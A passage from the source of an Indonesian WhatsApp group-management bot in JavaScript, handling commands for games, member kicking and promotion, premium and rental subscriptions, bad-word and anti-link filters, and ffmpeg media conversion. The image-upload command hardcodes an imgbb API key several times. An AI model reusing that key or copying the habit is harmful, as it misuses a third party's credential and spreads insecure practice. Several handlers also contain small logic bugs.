										await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai!' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
										addVote(from,split[1],split[0],split[2],reply)
									}
									break
						case 'tictactoe': case 'ttt':
									if (!isGroup)return reply('*Khusus group*')
									if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
									if (!Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
									if (fs.existsSync(`./database/user/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
									if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
									tttSkuy = setTtt(`${from}`)
									tttSkuy.status = false
									tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
									tttSkuy.Y = args[0].replace("@", "");
									fs.writeFileSync(`./database/user/${from}.json`, JSON.stringify(tttSkuy, null, 2))
									starGame = `『 *MEMULAI GAME TICTACTOE* 』${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
									Zeeone.sendMessage(from, starGame, text, {quoted: Ofc, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
									break
						case 'sewabot': 
									let gakloo = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `donasi`,
										"buttonText": {
											"displayText": "DONASI"
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, sewabotkak(), `Sewa bot om?`,  thumbnail, gakloo,{})
										break
						case 'donasi':
									reply('Isi sendiri')
									break
						case 'join':case 'joingc':
									if (!q) return reply('Linknya?')
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
										if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Lord')
										reply('Tunggu Sebentar Otw Masuk Group')
										link = args[0].replace('https://chat.whatsapp.com/','')
										fak = Zeeone.query({ json: ['action', 'invite', link],
										expect200: true })
										reply('Berhasil Masuk Grup')
									break
						case 'kick': case 'headsot':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									kick(from, mentionUser)
									break
						case 'revoke': case 'resetlinkgc': case 'resetlink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									Zeeone.query({ json: ['action', 'inviteReset', from], expect200: true })
									reply(`Sukses Reset Link Group!`)
									break
						case 'linkgc': case 'gclink': case 'linkgrup': case 'linkgroup': case 'grouplink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)   
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									linkgc = await Zeeone.groupInviteCode (from)
									yeh = `*https://chat.whatsapp.com/${linkgc}*`
									Zeeone.sendMessage(from, {text: yeh,
									matchedText: 'https://chat.whatsapp.com/' + linkgc, 
									canonicalUrl: `https://chat.whatsapp.com/${linkgc}`, 
									description: `https://chat.whatsapp.com/${linkgc}`, 
									title: `${groupName}`, 
									jpegThumbnail: thumbnail}, 'extendedTextMessage', { detectLinks: false, contextInfo: {mentionedJid: [yeh]}, quoted: Ofc})
									break
						case 'add':
									try {
										if (!isGroup) return reply(mess.only.group)
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)  
										if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
										if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) {
											entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await Zeeone.groupAdd(from, [entah])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return reply('Eror, user private acc')
											if(inv[0].code == 408) return reply('Eror, user baru saja keluar')
											if(inv[0].code == 401) return reply('Eror, Karena Bot Di Block Oleh Target')
												} else {
													entah = Ofc.message.extendedTextMessage.contextInfo.participant
													response = await Zeeone.groupAdd(from, [entah])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return reply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
													if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target')
												}
											} catch {
												return 
											}
									break
						case 'setthumb': case 'setthum':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									boij = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									delb = await Zeeone.downloadMediaMessage(boij)
									fs.writeFileSync('./image/thumb.jpg', delb)
									matanecok = fs.readFileSync('./image/thumb.jpg')
									await sleep(5000)
									reply(`Sukses`)
									break    
						case 'auto':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!q) return 
									if (
									args[0].toLowerCase() === 'ngetik' ||
									args[0].toLowerCase() === 'ketik' ||
									args[0].toLowerCase() === 'typing'
									){
										ngetik = true
										autovn = false
										reply(`Sukses....`)
										} else if (
										args[0].toLowerCase() === 'voicenote' ||
										args[0].toLowerCase() === 'recording' ||
										args[0].toLowerCase() === 'vn' 
									){
										ngetik = false
										autovn = true
										reply(`Sukses...`)
										} else {
											}
										}
									break
						case 'changeprefix': case 'setprefix':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!q) return 
									if (
									args[0].toLowerCase() === 'multi' ||
									args[0].toLowerCase() === 'all' ||
									args[0].toLowerCase() === 'allprefix' ||
									args[0].toLowerCase() === 'multiprefix'
									){
										multiprefix = true
										nopref = false
										reply(`Berhasil Mengubah Prefix Ke Multi Prefix`)
										} else if (
										args[0].toLowerCase() === 'nopref' ||
										args[0].toLowerCase() === 'no' ||
										args[0].toLowerCase() === 'nonpref'
									){
										multiprefix = false
										nopref = true
										reply(`Berhasil Mengubah Prefix Ke No Prefix`)
										} else if(args[0] === `${q}`){
											if (q.length > 2) return reply(`Maximal 1 angka/huruf!!`)
											multiprefix = false
											nopref = false
											prefa = `${args[0]}`
											reply(`Berhasil Mengubah Prefix Ke *${q}*`)
										}
									break
						case 'setnamabot':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.updateProfileName(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									 }
									break
						case 'setbiobot':{
									 if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.setStatus(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									}
									break
						case 'grup': case 'grub': case 'group':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args[0] === "open") {
										Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, false)
										} else if (args[0] === "close") {
											Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, true)
											} else {
												reply (`${prefix + command} buka / tutup`)
												}
									break 
						case 'promote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) return;
									if (Ofc.message.extendedTextMessage.contextInfo.participant === undefined) {
										entah = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
										if (entah.length > 0) {
											var mems_ids = []
											for (let ids of entah) {
												mems_ids.push(ids)
												}
												Zeeone.groupMakeAdmin(from, mems_ids)
												} else {
													Zeeone.groupMakeAdmin(from, entah)
													}
												} else {
													entah = Ofc.message.extendedTextMessage.contextInfo.participant 
													Zeeone.groupMakeAdmin(from, [entah])
												}
									break
						case 'demote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) return;
									if (Ofc.message.extendedTextMessage.contextInfo.participant === undefined) {
										entah = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
										if (entah.length > 0) {
											var mems_ids = []
											for (let ids of entah) {
												mems_ids.push(ids)
												}
												Zeeone.groupDemoteAdmin(from, mems_ids)
												} else {
													Zeeone.groupDemoteAdmin(from, [entah[0]])
													}
													} else {
														entah = Ofc.message.extendedTextMessage.contextInfo.participant
														Zeeone.groupDemoteAdmin(from, [entah])
													}
									break
						case 'setnamagrup': case 'setnamegrup': case 'setgrupname':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0) return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateSubject(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setdesc': case 'setdesk': case 'setdeskripsi':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0)  return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateDescription(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setppbot':
									if (!isOwner && !Ofc.key.fromMe) return
									if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
									enmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(enmedia)
									await Zeeone.updateProfilePicture(botNumber, media)
									reply('Makasih pp barunya lord 🌝')
									break
						case 'setppgrup':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadMediaMessage(encmedia)
										Zeeone.updateProfilePicture(from, media)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
										} else if (isQuotedSticker){
											if (Ofc.message.videoMessage) return reply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return reply('Eror Lord')
												buffer = fs.readFileSync(ran)
												Zeeone.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												reply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
						case 'premium': 
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args[0] === 'add') {
										if (Ofc.message.extendedTextMessage != undefined) {
											mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
											premium.addPremiumUser(mentioned[0], args[2], _premium)
											reply(`*『 PREMIUM ADDED 』*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
											} else {
												premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
												reply(`*『 PREMIUM ADDED 』*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
												}
												} else if (args[0] === 'del') {
													if (Ofc.message.extendedTextMessage != undefined) {
														mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
														_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
														fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
														reply(mess.succes)
														} else {
															_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
															fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
															reply(mess.succes)
															}
															} else {
																 reply(`Example : ${prefix + command} add/del 6282138919347 10s`)
															}
										break
						case 'cekprem': case 'cekpremium': case 'premiumcek':
									if (!isPremium) return reply(`Kamu bukan user premium\nkirim perintah ${prefix}daftarprem untuk membeli premium`)
									let cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									let premiumnya = `*『 PREMIUM EXPIRE 』*\n\n🆔 *ID*: ${sender}\n⏰ *Expired*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`
									reply(`${isOwner?'Unlimited Prem (My Lord)':premiumnya}`)
									break
						
						case 'listprem': case 'listpremium': case 'premiumlist': case 'premlist':
									if (!isOwner && !Ofc.key.fromMe) return
									let txt = `*『 LIST PREMIUM 』*\n\n*💹 Total :* ${_premium.length}\n\n`
									let men = [];
									for (let i of _premium){
										men.push(i.id)
										let cekvip = ms(i.expired - Date.now())
										txt += `*🆔 Nomor : ${i.id.split("@")[0]}*\n*📛 User : @${i.id.split("@")[0]}*\n📊 Expired : ${cekvip.days} Day (s), ${cekvip.hours} Hour (s), ${cekvip.minutes} Minute (s), ${cekvip.seconds} Second (s)`
									}
									reply(`${txt}`)
									break
						case 'extend': case 'perpanjang':
									if (!isSewa) return reply('Kamu belum sewa bot sebelumnya? klik #sewabot')
									reply('Sedang Mengirim Pesan Perpanjangan Masa Sewa Ke Owner Bot')
									Zeeone.sendMessage(`${owner_number}@s.whatsapp.net`, `Hai Owner, @${sender.split("@")[0]} Mau Memperpanjang Waktu Sewa Bot`, text, {contextInfo: {"mentionedJid" : [sender]}})
									break
						case 'sewa':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.sewabot)
									if(!isGroup) return reply(mess.only.group)
									if (q === 'add') {
										_sewa.addSewaGroup(from, args[1], sewa)
										reply(`Sukses Lord`)
									} else if (q === 'del') {
										sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
										fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
										reply(`Sukses Lord`)
										} else {
										}
									}
									break
						case 'sewalist':  case 'listsewa':
									if (!isOwner && !Ofc.key.fromMe) return
									let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
									for (let i of sewa){
										let cekviopp = ms(i.expired - Date.now())
										txtnyee += `🆔 *ID :* ${i.id}\n📊 *Expire :* ${cekviopp.days} day(s) ${cekviopp.hours} hour(s) ${cekviopp.minutes} minute(s) ${cekviopp.seconds} second(s)\n\n`
										}
										reply(txtnyee)
									break
						case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return reply(mess.only.group)
									if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `『 *SEWA EXPIRE* 』

🆔 *ID*: ${from}
💹 *EXPIRE :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
									reply(sewenye)
									break
						case 'antibadword': case 'nobadword':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group`)
									if (args.length === 0) return reply(`Pilih on atau off`)
									if (args[0] == 'on'){
										if (isBadword) return reply(`Udah aktif Lord`)
										grupbadword.push(from)
										fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
										reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
										} else if (args[0] == 'off'){
											anu = grupbadword.indexOf(from)
											grupbadword.splice(anu, 1)
											fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
											reply('Antibadword Grup Dimatikan')
											} else {
												reply('pilih on / off')
												}
									break
						case 'antilink':
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntiLink) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											antilink.push(from)
											fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
											reply(`Succes mengaktifkan Fitur Antilink`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntiLink) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var au = antilink.indexOf(from)
												antilink.splice(au, 1)
												fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
												reply(`Succes Mematikan Fitur Antilink`)
												} else {
													reply(`${prefix + command} on / off`)
													}
											break
						case 'listbadword':
									if (isBanned) return
									let bi = `List badword\n\n`
									for (let boo of badword){
										bi += `- ${boo}\n`
										}
										bi += `\nTotal : ${badword.length}`
									reply(bi)
									break
						case 'addbadword':
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (isKasar(args[0].toLowerCase(), badword)) return reply(`Cari nama lain Lord`)
										addBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Udah ada`)
											addBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									break
						case 'delbadword':{
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (!isKasar(args[0].toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
										delBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (!isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
											delBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									}
									break
						case 'clearbadword':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!m.quoted) return reply(`Reply Pesan Target!`)
									entah = Ofc.message.extendedTextMessage.contextInfo.participant
									delCountKasar(entah, senbadword)
									reply(`Sukses clear badword ${entah}`)
									break
						case 'antitroli': case 'antifaketroli':{
									try {
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntro) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											atro.push(from)
											fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
											reply(`Succes mengaktifkan Fitur Anti-Troli`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntro) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var ou = atro.indexOf(from)
												atro.splice(ou, 1)
												fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
												reply(`Succes Mematikan Fitur Anti-Troli`)
												}
											} catch {
												}
											}
									break
						case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
									var p = await Zeeone.getStatus(`${sender}`, MessageType.text)
									let cek = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									Zeeone.sendMessage(from, pp_userz, image, {thumbnail:pp_userz, caption:` * USER PROFILE*

📛 Nama : ${pushname==undefined?sender.split("@")[0]:pushname}
🎯 Bio : ${p.status==undefined?`Not Found`:p.status}
💬 Tag : @${sender.split("@")[0]}
🆔 Api : wa.me/${sender.split("@")[0]}

⬣ Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
⬣ Balance : ${getBalance(sender, balance)}
⬣ Role : ${role}
⬣ Level : ${getLevelingLevel(sender)}
⬣ Xp : ${getLevelingXp(sender)}
⬣ Status : ${isOwner?`Owner`:isPremium?`Premium User
⬣ Expired Prem : ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`:isUser?`Free User`:`Belum Daftar`}
⬣ Baned : ${isBanned?`Terbanned`:`Tidak Terbanned`}`, quoted: Ofc, contextInfo:{mentionedJid:[sender]}})
									}
									break
						case 'listonline': case 'listaktif':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
									let online = [...Object.keys(Zeeone.chats.get(ido).presences), Zeeone.user.jid]
									Zeeone.sendMessage(from, '*List Online :*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
										quoted: fakevideo,
										contextInfo: { mentionedJid: online }
										})
									break
							case 'infogc': case 'groupinfo': case 'infogrup': case 'grupinfo':
							console.log('eror bang fix sendiri')
									if (!isGroup) return reply(mess.only.group)
									try {
										ppUrl = await Zeeone.getProfilePicture(groupMetadata.jid)
											} catch {
												ppUrl = `${imagebb}`
												}
												let cekviip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
												let nya = `*G R O U P - I N F O*

📛 Nama : ${groupName}
👤 Owner Grup : ${groupMetadata.owner}
👥 Total Member : ${groupMembers.length}
👥 Total Admin : ${groupAdmins.length}
 
⬣ Welcome : ${isWelkom ? 'On':'Off'}
⬣ Anti Link : ${isAntiLink? 'On':'Off'}
⬣ Anti Badword : ${isBadword? 'On':'Off'}
⬣ Anti Fake Troli : ${isAntro? 'On':'Off'} ${isSewa?`
⬣ Expired Sewa : ${cekviip.days} Hari, ${cekviip.hours} Jam, ${cekviip.minutes} Menit, ${cekviip.seconds} Detik*`:``}
  
💬 Deskripsi Group :
\`\`\`${groupDesc}\`\`\``
									var jk = await getBuffer(thumbnail)
									Zeeone.sendMessage(from, jk, MessageType.image, {thumbnail: thumbnail, caption: nya, quoted: Ofc})
									break
						case 'caripesan': case 'searchmessage':
									if (!Ofc.key.fromMe && !isPremium) return reply(mess.only.prem)
									if(!q)return reply('Pesannya apa Lord?')
									reply('Otw Lord')
									let v = await Zeeone.searchMessages(q,from,10,1)
									let s = v.messages
									let el = s.filter(v => v.message)
									el.shift()
									try {
										if(el[0].message.conversation == undefined) return
										reply(`Ditemukan ${el.length} pesan`)
										await sleep(3000)
										for(let i = 0; i < el.length; i++) {
											await Zeeone.sendMessage(from,'Nih Pesannya',text,{quoted:el[i]})
											}
										} catch(e){
											reply('Pesan tidak ditemukan!')
											} 
									break
						case 'tomp3': case 'tomusic': case 'toaudio':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedVideo) return reply(`Reply video nya lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
									limitAdd(sender, limit)
									break
						case 'toptt': case 'tovn':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedAudio) return reply(`Reply Audionya Lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {ptt: true, mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'toimg': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !Ofc.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											Zeeone.sendMessage(from, buffer, image, {thumbnail : thumbnail, caption:'Sukses Lord',quoted:Ofc})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
										limitAdd(sender, limit)
									break
						case 'togif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									reply(mess.wait)
									if (Ofc.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									moew = await webp2gifFile(media)
									console.log(moew)
									Frd = await getBuffer(moew.result)
									Zeeone.sendMessage(from, Frd, video, { mimetype: 'video/gif', caption: 'Sukses Lord', quoted: Ofc })
									limitAdd(sender, limit)
									break
						case 'tovideo': case 'tomp4':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedSticker) return reply('Reply stiker gif lord')
									reply(mess.wait)
									if ((isMedia && !Ofc.message.videoMessage || isQuotedSticker) && args.length == 0) {
										ger = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
										webp2mp4File(owgi).then(res=>{
											Zeeone.sendMessage(from, res.result, video, { mimetype: Mimetype.mp4, filename: 'tovideo.mp4',caption: 'Sukses Lord', quoted: Ofc})
											})
										}else {
											reply('reply stiker')
										}
									fs.unlinkSync(owgi)
									limitAdd(sender, limit)
									break
						case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`─ 『 *AUDIO TO URL* 』 ─

*🔖 Url : ${Okelor.display_url}*`
										reply(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Ofc
											reply(mess.wait)
											owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 『 *IMAGE TO URL* 』 ─

*🔖Url : ${qbc.display_url}*`
											reply(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Ofc
												reply(mess.wait)
												owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`─ 『 *VIDEO TO URL* 』 ─

*🔖 Url : ${ffff.display_url}*`
												reply(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`─ 『 *STICKER TO URL* 』 ─

*🔖 Url : ${vrr.display_url}*`
													reply(teks)
												}
											break
						case 'q': case 'ulang':
									if (!m.quoted) return reply('reply pesan!')
									var jpio = Zeeone.serializeM(await m.getQuotedObj())
									if (!jpio.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
									await jpio.quoted.copyNForward(m.chat, true)
									break
						case 'block':
